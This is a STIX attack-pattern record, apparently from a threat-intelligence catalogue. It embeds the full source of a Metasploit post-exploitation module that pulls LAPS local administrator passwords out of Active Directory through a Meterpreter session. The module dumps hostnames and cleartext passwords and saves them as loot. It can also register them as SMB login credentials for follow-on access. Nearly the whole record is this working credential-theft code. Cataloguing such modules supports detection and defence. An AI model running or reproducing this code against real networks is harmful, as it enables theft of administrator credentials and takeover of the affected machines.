{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9896ce68-faad-4248-a17e-a46c53a07cb6",
    "created": "2024-08-14T16:33:08.758084Z",
    "modified": "2024-08-14T16:33:08.758088Z",
    "name": "Windows Gather Credentials Local Administrator Password Solution",
    "description": " This module will recover the LAPS (Local Administrator Password Solution) passwords configured in Active Directory, which is usually only accessible by privileged users. Note that the local administrator account name is not stored in Active Directory so it is assumed to be 'Administrator' by default.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/enum_laps.rb",
            "external_id": "enum_laps.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::LDAP\n\n  FIELDS = [\n    'distinguishedName',\n    'dNSHostName',\n    'ms-MCS-AdmPwd',\n    'ms-MCS-AdmPwdExpirationTime'\n  ].freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Credentials Local Administrator Password Solution',\n        'Description' => %q{\n          This module will recover the LAPS (Local Administrator Password Solution) passwords,\n          configured in Active Directory, which is usually only accessible by privileged users.\n          Note that the local administrator account name is not stored in Active Directory,\n          so it is assumed to be 'Administrator' by default.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ben Campbell',\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_net_resolve_hosts\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('LOCAL_ADMIN_NAME', [true, 'The username to store the password against', 'Administrator']),\n      OptBool.new('STORE_DB', [true, 'Store file in loot.', false]),\n      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', true]),\n      OptString.new('FILTER', [true, 'Search filter.', '(&(objectCategory=Computer)(ms-MCS-AdmPwd=*))'])\n    ])\n\n    deregister_options('FIELDS')\n  end\n\n  def run\n    search_filter = datastore['FILTER']\n    max_search = datastore['MAX_SEARCH']\n\n    begin\n      q = query(search_filter, max_search, FIELDS)\n    rescue ::RuntimeError, ::Rex::Post::Meterpreter::RequestError => e\n      print_error(e.message)\n      return\n    end\n\n    if q.nil? || q[:results].empty?\n      print_status('No results returned.')\n    else\n      print_status('Parsing results...')\n      results_table = parse_results(q[:results])\n      print_line results_table.to_s\n\n      if datastore['STORE_LOOT']\n        stored_path = store_loot('laps.passwords', 'text/plain', session, results_table.to_csv)\n        print_good(\"Results saved to: #{stored_path}\")\n      end\n    end\n  end\n\n  # Takes the results of LDAP query, parses them into a table\n  # and records and usernames as {Metasploit::Credential::Core}s in\n  # the database if datastore option STORE_DB is true.\n  #\n  # @param results [Array<Array<Hash>>] The LDAP query results to parse\n  # @return [Rex::Text::Table] the table containing all the result data\n  def parse_results(results)\n    laps_results = []\n    # Results table holds raw string data\n    results_table = Rex::Text::Table.new(\n      'Header' => 'Local Administrator Password Solution (LAPS) Results',\n      'Indent' => 1,\n      'SortIndex' => -1,\n      'Columns' => FIELDS\n    )\n\n    results.each do |result|\n      row = []\n\n      result.each do |field|\n        if field.nil?\n          row << ''\n        else\n          if field[:type] == :number\n            value = convert_windows_nt_time_format(field[:value])\n          else\n            value = field[:value]\n          end\n          row << value\n        end\n      end\n\n      hostname = result[FIELDS.index('dNSHostName')][:value].downcase\n      password = result[FIELDS.index('ms-MCS-AdmPwd')][:value]\n      dn = result[FIELDS.index('distinguishedName')][:value]\n      expiration = convert_windows_nt_time_format(result[FIELDS.index('ms-MCS-AdmPwdExpirationTime')][:value])\n\n      next if password.to_s.empty?\n\n      results_table << row\n      laps_results << {\n        hostname: hostname,\n        password: password,\n        dn: dn,\n        expiration: expiration\n      }\n    end\n\n    if datastore['STORE_DB']\n      print_status('Resolving IP addresses...')\n      hosts = []\n      laps_results.each do |h|\n        hosts << h[:hostname]\n      end\n\n      resolve_results = client.net.resolve.resolve_hosts(hosts)\n\n      # Match each IP to a host...\n      resolve_results.each do |r|\n        l = laps_results.find { |laps| laps[:hostname] == r[:hostname] }\n        l[:ip] = r[:ip]\n      end\n\n      laps_results.each do |r|\n        next if r[:ip].to_s.empty?\n        next if r[:password].to_s.empty?\n\n        store_creds(datastore['LOCAL_ADMIN_NAME'], r[:password], r[:ip])\n      end\n    end\n\n    results_table\n  end\n\n  def store_creds(username, password, ip)\n    service_data = {\n      address: ip,\n      port: 445,\n      service_name: 'smb',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      username: username,\n      private_data: password,\n      private_type: :password\n    }\n\n    credential_data.merge!(service_data)\n\n    # Create the Metasploit::Credential::Core object\n    credential_core = create_credential(credential_data)\n\n    # Assemble the options hash for creating the Metasploit::Credential::Login object\n    login_data = {\n      core: credential_core,\n      access_level: 'Administrator',\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }\n\n    # Merge in the service data and create our Login\n    login_data.merge!(service_data)\n    create_credential_login(login_data)\n  end\n\n  # https://gist.github.com/nowhereman/189111\n  def convert_windows_nt_time_format(windows_time)\n    unix_time = windows_time.to_i / 10000000 - 11644473600\n    ruby_time = Time.at(unix_time)\n    ruby_time.strftime('%d/%m/%Y %H:%M:%S GMT %z')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}